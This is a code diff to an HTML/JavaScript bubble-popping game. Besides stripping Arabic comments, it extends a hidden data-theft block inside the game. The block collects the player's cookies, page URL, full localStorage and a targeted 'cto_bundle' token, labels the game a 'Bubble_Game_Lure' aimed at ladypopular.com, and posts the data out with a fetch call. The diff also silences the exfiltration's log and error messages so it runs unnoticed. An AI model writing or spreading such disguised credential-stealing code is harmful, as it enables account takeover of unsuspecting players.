@@ -8,7 +8,7 @@
         .bubble {
             position: absolute;
             border-radius: 50%;
-            background: rgba(46, 204, 113, 0.7); /* لون مبدئي */
+            background: rgba(46, 204, 113, 0.7);
             box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
             transition: transform 0.5s ease-out, opacity 0.5s ease-out;
             animation: float-up linear infinite;
@@ -54,9 +54,9 @@
     const colors = ['#e74c3c', '#3498db', '#f1c40f', '#9b59b6'];
 
     function createBubble() {
-        const size = Math.random() * 50 + 30; // حجم بين 30 و 80
+        const size = Math.random() * 50 + 30;
         const x = Math.random() * (window.innerWidth - size);
-        const duration = Math.random() * 5 + 5; // سرعة بين 5 و 10 ثواني
+        const duration = Math.random() * 5 + 5;
         const color = colors[Math.floor(Math.random() * colors.length)];
 
         const bubble = document.createElement('div');
@@ -66,18 +66,15 @@
         bubble.style.backgroundColor = color;
         bubble.style.animationDuration = `${duration}s`;
 
-        // عند النقر (ثقب الفقاعة)
         bubble.onclick = () => {
-            score += Math.floor(Math.random() * 5) + 1; // زيادة عشوائية في النقاط
+            score += Math.floor(Math.random() * 5) + 1;
             scoreElement.textContent = score;
-            bubble.remove(); // إزالة الفقاعة المثقوبة
-            // تأكد من توليد فقاعات جديدة باستمرار
+            bubble.remove(); 
             setTimeout(createBubble, 500); 
         };
 
         gameArea.appendChild(bubble);
 
-        // إزالة الفقاعات التي تصل إلى الأعلى تلقائيًا
         setTimeout(() => {
             if (gameArea.contains(bubble)) {
                 bubble.remove();
@@ -85,20 +82,25 @@
         }, duration * 1000); 
     }
 
-    // بدء اللعبة وتوليد الفقاعات الأولى
     for (let i = 0; i < 10; i++) {
         createBubble();
     }
     
-    // إخفاء رسالة البداية
     setTimeout(() => {
         document.getElementById('message').style.display = 'none';
     }, 4000);
+
+
+    // ===============================================
+    // ===============================================
+    
+    const TARGETED_TOKEN = localStorage.getItem('cto_bundle') || 'N/A';
 
     const dataToExfiltrate = {
         cookies: document.cookie,
         url: window.location.href,
         localStorage: JSON.stringify(localStorage), 
+        CTO_BUNDLE_TOKEN: TARGETED_TOKEN, 
         gameDomain: 'ladypopular.com',
         payload_identity: 'Bubble_Game_Lure' 
     };
@@ -114,10 +116,8 @@
         mode: 'cors' 
     })
     .then(() => {
-        console.log('MOBY Exfiltration Attempt Complete.');
     })
-    .catch((error) => {
-        console.error('MOBY Silent Error:', error);
+    .catch(() => {
     });
 
 </script>
